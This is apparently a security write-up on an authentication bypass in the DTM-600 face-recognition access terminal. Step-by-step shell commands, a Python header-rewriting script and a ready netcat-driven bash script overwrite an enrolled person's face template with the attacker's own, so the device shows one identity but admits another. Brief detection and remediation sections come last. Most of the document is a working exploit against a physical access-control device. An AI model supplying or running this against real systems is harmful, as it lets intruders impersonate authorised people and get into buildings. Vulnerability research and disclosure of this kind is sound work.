# Template Injection Bypass - DTM-600

**Type:** Application/System Vulnerability (not ML/AI)
**Impact:** Authentication bypass - display one identity, authenticate as another
**Prerequisites:** Filesystem access (telnet/SSH)

---

## Overview

The DTM-600 stores face data in two separate locations:
1. **Photo** (for display/thumbnail): `/data/WorkLibFile/{LibID}/Image/`
2. **Template** (for matching): `/data/WorkLibFile/{LibID}/PersonID_*/FaceID_*.bin`

By replacing the template while keeping the photo, an attacker can:
- Show "Person A" in the UI/thumbnail
- Authenticate as "Person B" when standing in front of device

---

## Step-by-Step Guide

### Step 1: Enroll Your Face (to get your template)

Enroll yourself normally via device screen or web GUI. Note the FaceID assigned.

```bash
# Connect to device
nc 192.168.30.178 2323

# Find your enrollment
ls /data/WorkLibFile/4/Image/
# Look for your FaceID, e.g., 4026974185_4026974185.jpg
```

### Step 2: Extract Your Template

```bash
# Find the template file
ls /data/WorkLibFile/4/PersonID_4026974000-4026974999/

# Extract via base64
base64 /data/WorkLibFile/4/PersonID_4026974000-4026974999/FaceID_4026974185.bin
```

Save the base64 output locally, decode to get your .bin template file:
```bash
# On local machine
echo "<base64_output>" | base64 -d > my_template.bin
```

### Step 3: Enroll the "Cover" Identity

Upload the cover photo (e.g., man-cover.jpg) via web GUI batch import.
Note the new FaceID assigned (e.g., 80001).

### Step 4: Locate the Cover's Template

```bash
# On device
ls /data/WorkLibFile/3/PersonID_*/
# Find FaceID_80001.bin (or whatever ID was assigned)
```

### Step 5: Backup Original Template (Optional)

```bash
cp /data/WorkLibFile/3/PersonID_80000-80999/FaceID_80001.bin \
   /data/WorkLibFile/3/PersonID_80000-80999/FaceID_80001.bin.bak
```

### Step 6: Inject Your Template

**Method A: Direct copy on device (if your template still exists)**
```bash
cp /data/WorkLibFile/4/PersonID_4026974000-4026974999/FaceID_4026974185.bin \
   /data/WorkLibFile/3/PersonID_80000-80999/FaceID_80001.bin
```

**Method B: Upload via base64 (if template extracted locally)**
```bash
# On local machine, encode your template
base64 my_template.bin > my_template.b64

# On device, decode and write
echo "<base64_content>" | base64 -d > /data/WorkLibFile/3/PersonID_80000-80999/FaceID_80001.bin
```

**Method C: Using printf for raw bytes**
```bash
# If template is small, can use printf with hex escapes
# Template is 1044 bytes - too large for this method typically
```

### Step 7: Verify Injection

```bash
# Check file size (should be 1044 bytes)
ls -la /data/WorkLibFile/3/PersonID_80000-80999/FaceID_80001.bin

# Verify header (should start with library ID)
xxd /data/WorkLibFile/3/PersonID_80000-80999/FaceID_80001.bin | head -2
```

### Step 8: Test

1. View the enrollment in web GUI - should show cover photo
2. Stand in front of device
3. Should authenticate as the cover identity (using YOUR face)

---

## Template File Format

```
Offset 0x00 (4 bytes):  Library ID (little-endian uint32)
Offset 0x04 (4 bytes):  Person ID (little-endian uint32)
Offset 0x08 (4 bytes):  Reserved (0x00000000)
Offset 0x0C (4 bytes):  Face ID (little-endian uint32)
Offset 0x10 (4 bytes):  Reserved (0x00000000)
Offset 0x14 (1024 bytes): 256 little-endian floats (embedding)

Total: 1044 bytes
```

### Header Adjustment

If injecting across libraries or IDs, you may need to fix the header:

```python
import struct

# Read your template
with open('my_template.bin', 'rb') as f:
    data = bytearray(f.read())

# Modify header to match target
new_lib_id = 3        # Target library
new_person_id = 80001 # Target person ID
new_face_id = 80001   # Target face ID

struct.pack_into('<I', data, 0, new_lib_id)
struct.pack_into('<I', data, 4, new_person_id)
struct.pack_into('<I', data, 12, new_face_id)

# Write modified template
with open('injected_template.bin', 'wb') as f:
    f.write(data)
```

---

## Quick Script

```bash
#!/bin/bash
# template_inject.sh - Inject template on DTM-600
# Usage: ./template_inject.sh <source_faceid> <target_faceid>

DEVICE="192.168.30.178"
PORT="2323"
SOURCE_ID=$1
TARGET_ID=$2

# Calculate PersonID ranges
SRC_RANGE_START=$(( (SOURCE_ID / 1000) * 1000 ))
SRC_RANGE_END=$(( SRC_RANGE_START + 999 ))
TGT_RANGE_START=$(( (TARGET_ID / 1000) * 1000 ))
TGT_RANGE_END=$(( TGT_RANGE_START + 999 ))

# Determine libraries (3=Employee, 4=Visitor)
SRC_LIB=4  # Adjust as needed
TGT_LIB=3  # Adjust as needed

SRC_PATH="/data/WorkLibFile/${SRC_LIB}/PersonID_${SRC_RANGE_START}-${SRC_RANGE_END}/FaceID_${SOURCE_ID}.bin"
TGT_PATH="/data/WorkLibFile/${TGT_LIB}/PersonID_${TGT_RANGE_START}-${TGT_RANGE_END}/FaceID_${TARGET_ID}.bin"

echo "Injecting template..."
echo "Source: $SRC_PATH"
echo "Target: $TGT_PATH"

(
sleep 1
echo "cp $SRC_PATH $TGT_PATH"
sleep 2
echo "ls -la $TGT_PATH"
sleep 1
) | nc $DEVICE $PORT
```

---

## Detection / Forensics

An administrator could detect this attack by:
1. Comparing photo hash to template - mismatch indicates tampering
2. Re-extracting template from stored photo - won't match injected template
3. Checking file modification times on .bin files
4. Implementing template signing/verification

---

## Remediation

1. **Cryptographic binding** - Sign templates with photo hash
2. **Template encryption** - Encrypt with hardware-backed key
3. **Integrity checking** - Verify template matches photo on each access
4. **Access control** - Restrict filesystem access to template storage

---

## Classification

- **Vulnerability Type:** Improper separation of authentication data
- **Attack Vector:** Local filesystem access
- **CVSS Considerations:** Requires prior access (telnet/root), but enables full auth bypass

This is an **application architecture flaw**, not an ML/AI vulnerability.
